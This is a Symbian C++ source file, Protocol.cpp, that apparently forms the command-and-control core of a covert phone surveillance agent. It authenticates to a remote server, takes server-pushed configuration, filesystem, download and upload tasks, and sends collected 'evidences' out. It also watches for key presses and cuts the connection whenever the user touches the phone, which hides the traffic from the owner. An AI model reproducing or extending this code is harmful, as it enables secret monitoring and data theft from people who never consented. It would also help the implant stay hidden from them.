/*
 ============================================================================
 Name		: Protocol.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CProtocol implementation
 ============================================================================
 */
#include "Protocol.h"
#include <e32std.h>
#include <random.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include "AbstractState.h"
#include "StateAuthentication.h"
#include "StateIdentification.h"
#include "StateNone.h"
#include "StateBye.h"
#include "StateEvidences.h"
#include "StateNewConf.h"
#include "StateFileSystem.h"
#include "StateDownload.h"
#include "StateUpload.h"



CProtocol::CProtocol(MProtocolNotifier& aNotifier) :
	iNotifier(aNotifier),iStates(2)
	{
	iHost.Zero();
	iCookie.Zero();
	iSessionKey.Zero();
	}

CProtocol::~CProtocol()
	{
	__FLOG(_L("Destructor"));
	iStates.Close();
	delete iCurrentState;
	delete iNetwork;
	delete iUserMonitor;
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

CProtocol* CProtocol::NewLC(MProtocolNotifier& aNotifier)
	{
	CProtocol* self = new (ELeave) CProtocol(aNotifier);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CProtocol* CProtocol::NewL(MProtocolNotifier& aNotifier)
	{
	CProtocol* self = CProtocol::NewLC(aNotifier);
	CleanupStack::Pop(); // self;
	return self;
	}

void CProtocol::ConstructL()
	{
	__FLOG_OPEN("HT", "Protocol.txt");
	__FLOG(_L("------------"));
	
	iCurrentState = CStateNone::NewL(*this);
	
	iUserMonitor = NULL;
	}

void CProtocol::StartRestProtocolL(TBool aMonitor,RSocketServ& aSocketServ, RConnection& aConnection, const TDesC& aServer, TInt aPort)
	{
	iHost.Copy(aServer);
	iServer.Copy(aServer);
	iPort = aPort;
	
	__FLOG(_L("Connect To Server..."));
	delete iNetwork;
	iNetwork = NULL;
	iNetwork = CNetwork::NewL(aSocketServ, aConnection, *this);

	//activate user monitor
	if(aMonitor)
		{
		delete iUserMonitor;
		iUserMonitor = NULL;
		iUserMonitor = CEventCapturer::NewL(*this); 
		iUserMonitor->Listen();
		}
	// Append states to the states list in the ordered sequence
	iStates.AppendL(EState_Identification);
	iStates.AppendL(EState_Evidences);
	iStates.AppendL(EState_Bye);
	// start the first state
	CAbstractState* authentication = CStateAuthentication::NewL(*this);
	delete iCurrentState;
	iCurrentState = authentication;
		
	iNetwork->ConnectToServerL( aServer, aPort); 
	}

void CProtocol::NotifyConnectionCompleteL()
	{
	__FLOG(_L("Connected!"));
	iCurrentState->ActivateL(iSessionKey);
	}


void CProtocol::SetAvailables(TInt aNumAvailables,const TDesC8& aAvailables)
	{
	TUint8* ptr = (TUint8 *)aAvailables.Ptr();
	for(TInt i=0;i<aNumAvailables; i++)
		{
		//retrieve the available type
		TUint32 available;
		Mem::Copy(&available,ptr,4);  //4=sizeof(TUint32)
		ptr += 4;
		//add the available to the list of states, immediately before the evidences state
		TInt stateCount  = iStates.Count();
		iStates.Insert(available,stateCount-2);  //-2, last 2 states are always evidences and bye
		}
	}


void CProtocol::ChangeStateL()
	{
	iNetwork->Disconnect();
	
	TInt state = GetNextState();
	switch(state)
		{
		case EState_Identification:
			{
			CAbstractState* ident = CStateIdentification::NewL(*this);
			delete iCurrentState;
			iCurrentState = ident;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_NewConf:
			{
			CAbstractState* newConf = CStateNewConf::NewL(*this);
			delete iCurrentState;
			iCurrentState = newConf;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_FileSystem:
			{
			CAbstractState* fileSystem = CStateFileSystem::NewL(*this);
			delete iCurrentState;
			iCurrentState = fileSystem;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_Download:
			{
			CAbstractState* download = CStateDownload::NewL(*this);
			delete iCurrentState;
			iCurrentState = download;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_Upload:
			{
			CAbstractState* upload = CStateUpload::NewL(*this);
			delete iCurrentState;
			iCurrentState = upload;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_Evidences:
			{
			CAbstractState* evidences = CStateEvidences::NewL(*this);
			delete iCurrentState;
			iCurrentState = evidences;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_Bye:
			{
			CAbstractState* bye = CStateBye::NewL(*this);
			delete iCurrentState;
			iCurrentState = bye;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		case EState_None:
			{
			//stop monitoring
			if(iUserMonitor)
				{
				delete iUserMonitor;
				iUserMonitor = NULL;
				}
			//notify action
			iNotifier.ConnectionTerminatedL(KErrNone);
			}
			break;
		default:
			{
			iNetwork->ConnectToServerL(iServer,iPort);
			//TODO: think about
			ChangeStateL();
			}
			break;
		}
	}

void CProtocol::SendStateDataL(const TDesC8& data)
	{
	__FLOG_1(_L("Outgoing Data State: %d"), iCurrentState->Type());
	iNetwork->SendL(data);
	}

void CProtocol::NewConfigAvailable()
	{
	__FLOG(_L("New config file!"));
	iNotifier.NewConfigDownloaded();
	}

void CProtocol::NotifyDataReceivedL(const TDesC8& aData)
	{
	__FLOG_1(_L("Incoming Data State: %d"), iCurrentState->Type());
	iCurrentState->ProcessDataL(aData);
	}

void CProtocol::NotifySendingCompleteL()
	{
	__FLOG(_L("Data Sent!"));
	if (iCurrentState->Type() == EState_None)
		{
		iNetwork->Disconnect();
		return;
		}
	}

void CProtocol::NotifyDisconnectionCompleteL()
	{
	__FLOG_1(_L("Disconnection State: %d"), iCurrentState->Type());
	
	}

void CProtocol::NotifyNetworkError(TInt aError)
	{
	__FLOG_2(_L("Network Error:%d  State:%d"), aError, iCurrentState->Type());
	//delete iCurrentState;
	//iCurrentState = NULL;
	if(iUserMonitor)
		{
		delete iUserMonitor;
		iUserMonitor = NULL;
		}
	iNotifier.ConnectionTerminatedL(aError);
	}

HBufC8* CProtocol::GetRequestHeaderL()
	{
	return CRestUtils::GetRestHeaderL(iHost,iCookie);
	}

void CProtocol::SetCookie(const TDesC8& aCookie)
	{
	iCookie.Copy(aCookie);
	}

void CProtocol::SetKey(const TDesC8& aKey)
	{
	iSessionKey.Copy(aKey);
	}

void CProtocol::ReConnect()
	{
	iNetwork->Disconnect();
	iNetwork->ConnectToServerL(iServer,iPort);
	}

void CProtocol::ResponseError(TInt aError)
	{
	//with KErrAuth simply close connection
	//with other errors send bye
	switch(aError)
		{
		case KErrAuth:
			{
			if(iUserMonitor)
				{
				delete iUserMonitor;
				iUserMonitor = NULL;
				}
			iNetwork->Disconnect();
			iNotifier.ConnectionTerminatedL(aError);
			}
			break;
		case KErrContent:
		case KErrSha:
		case KErrNotOk:
		default:
			{
			iNetwork->Disconnect();
			CAbstractState* bye = CStateBye::NewL(*this);
			delete iCurrentState;
			iCurrentState = bye;
			iNetwork->ConnectToServerL(iServer,iPort);
			}
			break;
		}
	}


TInt CProtocol::GetNextState()
	{
	if(iStates.Count()>0)
		{
		TInt nextState(iStates[0]);
		iStates.Remove(0);
		return nextState;
		}
	return 0;
	}


TBool CProtocol::KeyEventCaptured(TWsEvent aEvent)
	{
		
	iNetwork->Disconnect();
	
	iNotifier.ConnectionTerminatedL(KErrNone);
	
	return ETrue;
	}

